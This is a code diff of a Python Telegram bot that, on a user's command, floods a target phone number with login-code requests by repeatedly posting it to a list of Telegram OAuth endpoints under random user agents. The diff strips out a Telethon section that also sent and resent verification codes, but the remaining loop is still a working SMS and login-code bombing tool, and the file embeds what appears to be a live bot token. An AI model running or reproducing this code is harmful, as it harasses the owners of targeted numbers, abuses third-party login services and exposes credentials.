@@ -4,14 +4,8 @@ from fake_useragent import UserAgent
 import time
 import threading
 import random
-from telethon import TelegramClient
-from telethon.errors import FloodWaitError
-from telethon.tl.functions.auth import ResendCodeRequest
 
 bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")
-
-api_id = 33180472
-api_hash = "025b7581493ae0d83c3946f27a149057"
 
 endpoints = [
     'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
@@ -51,11 +45,9 @@ def handle(m):
     if m.chat.id in active:
         bot.reply_to(m, "уже спамим")
         return
-    bot.reply_to(m, "спамлю заявки и коды")
+    bot.reply_to(m, "спамлю")
     def worker(chat_id, phone):
         ua = UserAgent()
-        client = TelegramClient(f"session_{random.randint(1,999999)}", api_id, api_hash)
-        client.connect()
         active[chat_id] = {'stop': False}
         try:
             while not active[chat_id]['stop']:
@@ -68,27 +60,10 @@ def handle(m):
                         requests.post(ep, headers=headers, data=data, timeout=10)
                     except:
                         pass
-                    time.sleep(random.uniform(0.5, 1.0))
-                if active[chat_id]['stop']:
-                    break
-                try:
-                    result = client.send_code_request(phone)
-                    if result and hasattr(result, 'phone_code_hash'):
-                        try:
-                            client(ResendCodeRequest(phone, result.phone_code_hash))
-                        except FloodWaitError as e:
-                            time.sleep(e.seconds + 1)
-                        except:
-                            pass
-                except FloodWaitError as e:
-                    time.sleep(e.seconds + 1)
-                except:
-                    pass
-                time.sleep(random.uniform(1.5, 2.5))
+                    time.sleep(random.uniform(1.5, 2.5))
         finally:
             if chat_id in active:
                 del active[chat_id]
-            client.disconnect()
     threading.Thread(target=worker, args=(m.chat.id, phone), daemon=True).start()
 
 if __name__ == '__main__':
